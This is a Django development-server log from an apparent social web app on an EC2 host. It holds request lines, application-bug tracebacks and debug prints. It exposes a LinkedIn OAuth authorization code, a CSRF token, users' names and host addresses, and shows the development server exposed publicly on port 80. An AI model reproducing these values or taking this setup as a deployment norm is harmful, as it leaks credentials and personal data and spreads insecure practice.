Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 10:11:45] "GET / HTTP/1.1" 400 62046
Not Found: /togther/
[07/Dec/2018 11:23:28] "GET /togther/ HTTP/1.1" 404 5934
[07/Dec/2018 11:23:31] "GET / HTTP/1.1" 302 0
[07/Dec/2018 11:23:32] "GET /dashboard/ HTTP/1.1" 200 12873
[07/Dec/2018 11:23:32] "GET /media/media/logo.jpeg HTTP/1.1" 304 0
[07/Dec/2018 11:23:40] "GET /media/media/IMG_20181201_152335.jpg HTTP/1.1" 200 4146379
[07/Dec/2018 11:23:41] "GET /media/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 200 4146379
[07/Dec/2018 11:23:48] "GET /community/1 HTTP/1.1" 301 0
[07/Dec/2018 11:23:48] "GET /community/1/ HTTP/1.1" 200 9029
Not Found: /community/1/media/IMG_20181201_152335.jpg
[07/Dec/2018 11:23:49] "GET /community/1/media/IMG_20181201_152335.jpg HTTP/1.1" 404 6033
Not Found: /community/1/media/IMG_20181201_152335_6yO0iAi.jpg
[07/Dec/2018 11:23:49] "GET /community/1/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 404 6057
Not Found: /community/1/logo.jpeg
[07/Dec/2018 11:23:50] "GET /community/1/logo.jpeg HTTP/1.1" 404 5973
[07/Dec/2018 11:25:55] "GET / HTTP/1.1" 302 0
[07/Dec/2018 11:25:56] "GET /dashboard/ HTTP/1.1" 200 12873
[07/Dec/2018 11:25:59] "GET /community/1/ HTTP/1.1" 200 9029
[07/Dec/2018 11:26:00] "GET /community/1/ HTTP/1.1" 200 9029
Not Found: /community/1/media/IMG_20181201_152335.jpg
[07/Dec/2018 11:26:00] "GET /community/1/media/IMG_20181201_152335.jpg HTTP/1.1" 404 6033
Not Found: /community/1/media/IMG_20181201_152335_6yO0iAi.jpg
[07/Dec/2018 11:26:01] "GET /community/1/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 404 6057
Internal Server Error: /community/1/join
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/contrib/auth/decorators.py", line 21, in _wrapped_view
    return view_func(request, *args, **kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 371, in join_community
    return render(request,'response_form.html',{"data":data, 'usr':user})
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/shortcuts.py", line 36, in render
    content = loader.render_to_string(template_name, context, request, using=using)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/loader.py", line 62, in render_to_string
    return template.render(context, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/backends/django.py", line 61, in render
    return self.template.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 171, in render
    return self._render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 163, in _render
    return self.nodelist.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 937, in render
    bit = node.render_annotated(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 904, in render_annotated
    return self.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/loader_tags.py", line 150, in render
    return compiled_parent._render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 163, in _render
    return self.nodelist.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 937, in render
    bit = node.render_annotated(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 904, in render_annotated
    return self.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/loader_tags.py", line 62, in render
    result = block.nodelist.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 937, in render
    bit = node.render_annotated(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 904, in render_annotated
    return self.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/defaulttags.py", line 442, in render
    url = reverse(view_name, args=args, kwargs=kwargs, current_app=current_app)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/urls/base.py", line 90, in reverse
    return iri_to_uri(resolver._reverse_with_prefix(view, prefix, *args, **kwargs))
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/urls/resolvers.py", line 622, in _reverse_with_prefix
    raise NoReverseMatch(msg)
django.urls.exceptions.NoReverseMatch: Reverse for 'community' with arguments '('',)' not found. 1 pattern(s) tried: ['community/(?P<community_id>[0-9]+)/$']
[07/Dec/2018 11:26:05] "GET /community/1/join HTTP/1.1" 500 166027
Not Found: /community/1/media/IMG_20181201_152335_6yO0iAi.jpg
[07/Dec/2018 11:27:02] "GET /community/1/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 404 6057
Internal Server Error: /community/1/join
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/contrib/auth/decorators.py", line 21, in _wrapped_view
    return view_func(request, *args, **kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 371, in join_community
    return render(request,'response_form.html',{"data":data, 'usr':user})
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/shortcuts.py", line 36, in render
    content = loader.render_to_string(template_name, context, request, using=using)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/loader.py", line 62, in render_to_string
    return template.render(context, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/backends/django.py", line 61, in render
    return self.template.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 171, in render
    return self._render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 163, in _render
    return self.nodelist.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 937, in render
    bit = node.render_annotated(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 904, in render_annotated
    return self.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/loader_tags.py", line 150, in render
    return compiled_parent._render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 163, in _render
    return self.nodelist.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 937, in render
    bit = node.render_annotated(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 904, in render_annotated
    return self.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/loader_tags.py", line 62, in render
    result = block.nodelist.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 937, in render
    bit = node.render_annotated(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 904, in render_annotated
    return self.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/defaulttags.py", line 442, in render
    url = reverse(view_name, args=args, kwargs=kwargs, current_app=current_app)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/urls/base.py", line 90, in reverse
    return iri_to_uri(resolver._reverse_with_prefix(view, prefix, *args, **kwargs))
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/urls/resolvers.py", line 622, in _reverse_with_prefix
    raise NoReverseMatch(msg)
django.urls.exceptions.NoReverseMatch: Reverse for 'community' with arguments '('',)' not found. 1 pattern(s) tried: ['community/(?P<community_id>[0-9]+)/$']
[07/Dec/2018 11:27:05] "GET /community/1/join HTTP/1.1" 500 166013
Internal Server Error: /community/1/join
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/contrib/auth/decorators.py", line 21, in _wrapped_view
    return view_func(request, *args, **kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 371, in join_community
    return render(request,'response_form.html',{"data":data, 'usr':user})
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/shortcuts.py", line 36, in render
    content = loader.render_to_string(template_name, context, request, using=using)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/loader.py", line 62, in render_to_string
    return template.render(context, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/backends/django.py", line 61, in render
    return self.template.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 171, in render
    return self._render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 163, in _render
    return self.nodelist.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 937, in render
    bit = node.render_annotated(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 904, in render_annotated
    return self.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/loader_tags.py", line 150, in render
    return compiled_parent._render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 163, in _render
    return self.nodelist.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 937, in render
    bit = node.render_annotated(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 904, in render_annotated
    return self.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/loader_tags.py", line 62, in render
    result = block.nodelist.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 937, in render
    bit = node.render_annotated(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 904, in render_annotated
    return self.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/defaulttags.py", line 442, in render
    url = reverse(view_name, args=args, kwargs=kwargs, current_app=current_app)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/urls/base.py", line 90, in reverse
    return iri_to_uri(resolver._reverse_with_prefix(view, prefix, *args, **kwargs))
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/urls/resolvers.py", line 622, in _reverse_with_prefix
    raise NoReverseMatch(msg)
django.urls.exceptions.NoReverseMatch: Reverse for 'community' with arguments '('',)' not found. 1 pattern(s) tried: ['community/(?P<community_id>[0-9]+)/$']
[07/Dec/2018 11:29:43] "GET /community/1/join HTTP/1.1" 500 166147
[07/Dec/2018 11:36:09] "GET / HTTP/1.1" 302 0
[07/Dec/2018 11:36:10] "GET /dashboard/ HTTP/1.1" 200 12873
[07/Dec/2018 11:39:26] "GET / HTTP/1.1" 302 0
[07/Dec/2018 11:39:27] "GET /dashboard/ HTTP/1.1" 200 12873
[07/Dec/2018 11:39:28] "GET /media/media/logo.jpeg HTTP/1.1" 200 28619
[07/Dec/2018 11:39:35] "GET /media/media/IMG_20181201_152335.jpg HTTP/1.1" 200 4146379
[07/Dec/2018 11:39:35] "GET /media/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 200 4146379
Not Found: /dashboard/logo.jpeg
[07/Dec/2018 11:39:37] "GET /dashboard/logo.jpeg HTTP/1.1" 404 5967
[07/Dec/2018 11:39:39] "GET /community/1 HTTP/1.1" 301 0
[07/Dec/2018 11:39:39] "GET /community/1/ HTTP/1.1" 200 9029
Not Found: /community/1/media/IMG_20181201_152335.jpg
[07/Dec/2018 11:39:40] "GET /community/1/media/IMG_20181201_152335.jpg HTTP/1.1" 404 6033
Not Found: /community/1/media/IMG_20181201_152335_6yO0iAi.jpg
[07/Dec/2018 11:39:40] "GET /community/1/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 404 6057
Not Found: /community/1/logo.jpeg
[07/Dec/2018 11:39:41] "GET /community/1/logo.jpeg HTTP/1.1" 404 5973
[07/Dec/2018 11:39:42] "GET /community/1/ HTTP/1.1" 200 9029
Not Found: /community/1/media/IMG_20181201_152335_6yO0iAi.jpg
[07/Dec/2018 11:39:43] "GET /community/1/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 404 6057
Not Found: /community/1/media/IMG_20181201_152335.jpg
[07/Dec/2018 11:39:44] "GET /community/1/media/IMG_20181201_152335.jpg HTTP/1.1" 404 6033
Internal Server Error: /community/1/join
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/contrib/auth/decorators.py", line 21, in _wrapped_view
    return view_func(request, *args, **kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 371, in join_community
    return render(request,'response_form.html',{"data":data, 'usr':user})
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/shortcuts.py", line 36, in render
    content = loader.render_to_string(template_name, context, request, using=using)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/loader.py", line 62, in render_to_string
    return template.render(context, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/backends/django.py", line 61, in render
    return self.template.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 171, in render
    return self._render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 163, in _render
    return self.nodelist.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 937, in render
    bit = node.render_annotated(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 904, in render_annotated
    return self.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/loader_tags.py", line 150, in render
    return compiled_parent._render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 163, in _render
    return self.nodelist.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 937, in render
    bit = node.render_annotated(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 904, in render_annotated
    return self.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/loader_tags.py", line 62, in render
    result = block.nodelist.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 937, in render
    bit = node.render_annotated(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 904, in render_annotated
    return self.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/defaulttags.py", line 442, in render
    url = reverse(view_name, args=args, kwargs=kwargs, current_app=current_app)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/urls/base.py", line 90, in reverse
    return iri_to_uri(resolver._reverse_with_prefix(view, prefix, *args, **kwargs))
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/urls/resolvers.py", line 622, in _reverse_with_prefix
    raise NoReverseMatch(msg)
django.urls.exceptions.NoReverseMatch: Reverse for 'community' with arguments '('',)' not found. 1 pattern(s) tried: ['community/(?P<community_id>[0-9]+)/$']
[07/Dec/2018 11:39:47] "GET /community/1/join HTTP/1.1" 500 166466
Not Found: /favicon.ico
[07/Dec/2018 11:39:49] "GET /favicon.ico HTTP/1.1" 404 5943
Not Found: /community/1/media/IMG_20181201_152335_6yO0iAi.jpg
[07/Dec/2018 11:39:51] "GET /community/1/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 404 6057
[07/Dec/2018 11:41:26] "GET /dashboard/ HTTP/1.1" 200 12873
[07/Dec/2018 11:41:28] "GET /dashboard/ HTTP/1.1" 200 12873
[07/Dec/2018 11:41:29] "GET /dashboard/ HTTP/1.1" 200 12873
[07/Dec/2018 11:41:34] "GET / HTTP/1.1" 302 0
[07/Dec/2018 11:41:34] "GET /dashboard/ HTTP/1.1" 200 12873
[07/Dec/2018 11:42:14] "GET /dashboard/ HTTP/1.1" 200 12873
[07/Dec/2018 11:43:30] "GET /creategroup/ HTTP/1.1" 200 5759
[07/Dec/2018 11:43:32] "GET / HTTP/1.1" 302 0
[07/Dec/2018 11:43:33] "GET /dashboard/ HTTP/1.1" 200 12873
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 11:44:32] "GET / HTTP/1.0" 400 62058
[07/Dec/2018 11:44:45] "GET /dashboard/ HTTP/1.1" 200 12873
[07/Dec/2018 11:44:46] "GET /dashboard/ HTTP/1.1" 200 12873
[07/Dec/2018 11:44:47] "GET /dashboard/ HTTP/1.1" 200 12873
[07/Dec/2018 11:44:49] "GET / HTTP/1.1" 302 0
[07/Dec/2018 11:44:50] "GET /dashboard/ HTTP/1.1" 200 12873
[07/Dec/2018 11:47:26] "GET /dashboard/ HTTP/1.1" 200 12873
[07/Dec/2018 11:49:13] "GET /dashboard/ HTTP/1.1" 200 12873
[07/Dec/2018 11:49:17] "GET /logout HTTP/1.1" 302 0
[07/Dec/2018 11:49:17] "GET / HTTP/1.1" 200 2428
[07/Dec/2018 11:49:18] "GET / HTTP/1.1" 200 2428
[07/Dec/2018 11:49:53] "GET / HTTP/1.1" 200 2428
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 11:50:10] "GET / HTTP/1.1" 400 62798
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /favicon.ico
[07/Dec/2018 11:50:11] "GET /favicon.ico HTTP/1.1" 400 62876
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[07/Dec/2018 21:25:09] "GET /dashboard/ HTTP/1.1" 200 14211
[07/Dec/2018 21:25:09] "GET /media/media/logo.jpeg HTTP/1.1" 304 0
[07/Dec/2018 21:25:10] "GET /media/media/IMG_20181201_152335.jpg HTTP/1.1" 304 0
[07/Dec/2018 21:25:10] "GET /media/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 304 0
[07/Dec/2018 21:25:10] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[07/Dec/2018 21:25:14] "GET /community/3 HTTP/1.1" 301 0
[07/Dec/2018 21:25:15] "GET /community/3/ HTTP/1.1" 200 10028
Internal Server Error: /profile/5
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/contrib/auth/decorators.py", line 21, in _wrapped_view
    return view_func(request, *args, **kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 225, in profile
    experiences = Experience.objects.all().filter(user_id = info[0])
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 303, in __getitem__
    return qs._result_cache[0]
IndexError: list index out of range
[07/Dec/2018 21:25:22] "GET /profile/5 HTTP/1.1" 500 76258
[07/Dec/2018 21:25:28] "GET /profile/3 HTTP/1.1" 200 21839
Not Found: /profile/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[07/Dec/2018 21:25:29] "GET /profile/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 6087
Performing system checks...

System check identified no issues (0 silenced).
December 07, 2018 - 21:25:07
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
{}
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
[<Userinfo: Apoorv Khare>]
{}
{}
<QuerySet []>
<QuerySet []>
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[07/Dec/2018 21:26:52] "GET /community/3/ HTTP/1.1" 200 10030
Not Found: /profile/
[07/Dec/2018 21:26:54] "GET /profile/ HTTP/1.1" 404 5934
Performing system checks...

System check identified no issues (0 silenced).
December 07, 2018 - 21:26:50
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
[<Userinfo: Apoorv Khare>]
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[08/Dec/2018 07:48:27] "GET /dashboard/ HTTP/1.1" 200 14211
[08/Dec/2018 07:48:27] "GET /media/media/logo.jpeg HTTP/1.1" 304 0
[08/Dec/2018 07:48:27] "GET /media/media/IMG_20181201_152335.jpg HTTP/1.1" 304 0
[08/Dec/2018 07:48:27] "GET /media/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 304 0
[08/Dec/2018 07:48:27] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[08/Dec/2018 07:48:30] "GET /community/3/ HTTP/1.1" 200 10031
[08/Dec/2018 07:48:41] "GET /requests HTTP/1.1" 200 5274
[08/Dec/2018 07:48:44] "GET / HTTP/1.1" 302 0
[08/Dec/2018 07:48:45] "GET /dashboard/ HTTP/1.1" 200 14211
[08/Dec/2018 07:57:27] "GET / HTTP/1.1" 200 2426
[08/Dec/2018 07:57:27] "GET /media/media/logo.jpeg HTTP/1.1" 200 12167
Not Found: /favicon.ico
[08/Dec/2018 07:57:28] "GET /favicon.ico HTTP/1.1" 404 5943
[08/Dec/2018 07:57:29] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[08/Dec/2018 07:57:58] "GET /oauth/complete/linkedin-oauth2/?code=AQT_ziavcQ2kE-HgwIkGyMJnmml4O5ugvocWiY6e5ncACeanE1TbEO47vSl56uioYsJgcdNQ6xQb_0EctIp6WYxqhO6jy6-RzDmko8rJeXuLB32cr0XGqgqNL1q74V9kwjFk1CVtuZJic48CwtDPXHFjFjG09DI66zvU71KFGo7hTkcuGkWQGSS1eYfj3g&state=yFDR0rKIWzQniVwkH7H8j9FSxTgb7wlI HTTP/1.1" 302 0
[08/Dec/2018 07:57:59] "GET /dashboard/ HTTP/1.1" 200 14211
[08/Dec/2018 07:58:01] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[08/Dec/2018 07:58:10] "GET /media/media/IMG_20181201_152335.jpg HTTP/1.1" 200 4146379
[08/Dec/2018 07:58:11] "GET /media/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 200 4146379
[08/Dec/2018 07:58:16] "GET /requests HTTP/1.1" 200 5274
Not Found: /logo.jpeg
[08/Dec/2018 07:58:17] "GET /logo.jpeg HTTP/1.1" 404 5937
[08/Dec/2018 07:58:20] "GET /requests HTTP/1.1" 200 5274
[08/Dec/2018 08:07:49] "GET / HTTP/1.1" 302 0
[08/Dec/2018 08:07:51] "GET /dashboard/ HTTP/1.1" 200 14211
[08/Dec/2018 08:07:51] "GET /media/media/logo.jpeg HTTP/1.1" 200 12167
[08/Dec/2018 08:07:53] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[08/Dec/2018 08:07:58] "GET /media/media/IMG_20181201_152335.jpg HTTP/1.1" 200 4146379
[08/Dec/2018 08:07:59] "GET /community/3 HTTP/1.1" 301 0
[08/Dec/2018 08:08:00] "GET /community/3/ HTTP/1.1" 200 10350
[08/Dec/2018 08:08:00] "GET /media/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 200 1646592
[08/Dec/2018 08:08:02] "GET /media/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 200 4146379
[08/Dec/2018 08:08:02] "GET /community/3/join HTTP/1.1" 200 6156
Not Found: /community/3/logo.jpeg
[08/Dec/2018 08:08:03] "GET /community/3/logo.jpeg HTTP/1.1" 404 5973
Internal Server Error: /community/3/join
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/contrib/auth/decorators.py", line 21, in _wrapped_view
    return view_func(request, *args, **kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 365, in join_community
    req.user_info = user
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/fields/related_descriptors.py", line 210, in __set__
    self.field.remote_field.model._meta.object_name,
ValueError: Cannot assign "<QuerySet [<Userinfo: Abhishek Sharma>]>": "Requests.user_info" must be a "Userinfo" instance.
[08/Dec/2018 08:08:18] "POST /community/3/join HTTP/1.1" 500 78942
Not Found: /favicon.ico
[08/Dec/2018 08:08:19] "GET /favicon.ico HTTP/1.1" 404 5943
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 08:09:29] "GET / HTTP/1.0" 400 62349
[08/Dec/2018 08:38:34] "GET /requests HTTP/1.1" 200 5274
Performing system checks...

System check identified no issues (0 silenced).
December 08, 2018 - 07:48:23
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
{}
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
[<Userinfo: Apoorv Khare>]
{}
<QuerySet [<Admins: Admins object (1)>]>
[]
{}
here
None
{}
{}
<QuerySet [<Admins: Admins object (1)>]>
[]
{}
<QuerySet [<Admins: Admins object (1)>]>
[]
{}
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
[<Userinfo: Apoorv Khare>]
3
data: <QuerySet [<Form_data: Form_data object (3)>, <Form_data: Form_data object (2)>, <Form_data: Form_data object (1)>]>
3
{'csrfmiddlewaretoken': 'V5GJ29jWYt9l586K392edb3L4tWzkQNZOCxZL4rJG7n4O9WRhhkJBDA4JZwamBgE', 'why': 'Amama', 'Experience': '5', 'College': '13'}
why
Experience
College
{}
<QuerySet [<Admins: Admins object (1)>]>
[]
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
